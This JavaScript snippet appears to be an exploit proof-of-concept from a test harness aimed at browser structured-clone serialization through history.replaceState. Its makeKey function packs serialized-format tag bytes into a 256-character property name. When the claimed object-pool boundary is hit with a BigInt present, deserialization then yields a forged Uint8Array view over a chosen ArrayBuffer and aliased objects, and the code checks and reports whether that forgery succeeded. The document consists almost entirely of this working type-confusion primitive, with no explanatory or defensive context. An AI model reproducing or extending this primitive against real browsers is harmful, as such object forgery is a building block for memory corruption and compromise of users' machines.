// Use the verified 255/256 object-pool boundary to construct a benign
// Uint8Array view (offset 0, length 8) from serialized property-name bytes.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02];
  for (var i = 0; i < 8; i++) bytes.push(0); // byteOffset = 0
  bytes.push(8);
  for (var j = 1; j < 8; j++) bytes.push(0); // byteLength = 8
  bytes.push(0x13, 3, 0); // ObjectReferenceTag, backing buffer at pool index 3
  bytes.push(0xff, 0xff, 0xff, 0xff); // object terminator
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function runCase(id, useBigInt) {
  var phase = "build";
  var result;
  try {
    var backing = new ArrayBuffer(8);
    new Uint8Array(backing).fill(0x41);
    var filler = new Array(253);
    filler[0] = useBigInt ? BigInt(1) << BigInt(40) : 0;
    filler[1] = backing;
    for (var i = 2; i < filler.length; i++) filler[i] = {};
    var shared = { marker: 0x51515151 };
    var key = makeKey();
    var input = {};
    input.filler = filler;
    input.first = shared;
    input.second = shared;
    input[key] = 0;
    if (useBigInt && api && typeof api.markSync === "function") api.markSync("small_view_ready");
    phase = "store";
    history.replaceState(input, "");
    if (useBigInt && api && typeof api.markSync === "function") api.markSync("small_view_stored");
    phase = "load";
    var output = history.state;
    if (useBigInt && api && typeof api.markSync === "function") api.markSync("small_view_loaded");
    phase = "inspect";
    var target = output.filler && output.filler[1];
    var synthetic = output["\u0000"];
    var isView = synthetic instanceof Uint8Array;
    var tailPreserved = Object.prototype.hasOwnProperty.call(output, key) && output[key] === 0;
    var expected = useBigInt ? isView && synthetic.buffer === target &&
      synthetic.byteOffset === 0 && synthetic.byteLength === 8 && synthetic[0] === 0x41 &&
      output.second === output.filler[252] && !tailPreserved :
      tailPreserved && output.first === output.second &&
      target instanceof ArrayBuffer && new Uint8Array(target)[0] === 0x41;
    result = { id: id, status: expected ? "pass" : "fail", details: {
      synthetic_is_view: isView,
      synthetic_buffer_is_target: isView ? synthetic.buffer === target : false,
      synthetic_byte_offset: isView ? synthetic.byteOffset : null,
      synthetic_byte_length: isView ? synthetic.byteLength : null,
      synthetic_first_byte: isView ? synthetic[0] : null,
      second_is_last_filler: output.second === output.filler[252],
      first_second_alias: output.first === output.second,
      tail_preserved: tailPreserved,
      key_length: key.length
    } };
  } catch (error) {
    result = { id: id, status: "error", details: {
      phase: phase, error: String(error).slice(0, 200)
    } };
  }
  try { history.replaceState(null, ""); result.details.cleanup_ok = true; }
  catch (error) { result.status = "error"; result.details.cleanup_ok = false; }
  return result;
}
var control = runCase("small_view_no_bigint_control", false);
if (control.status !== "pass")
  return [control, { id: "small_view_bigint_case", status: "unsupported", details: { reason: "control_failed" } }];
return [control, runCase("small_view_bigint_case", true)];
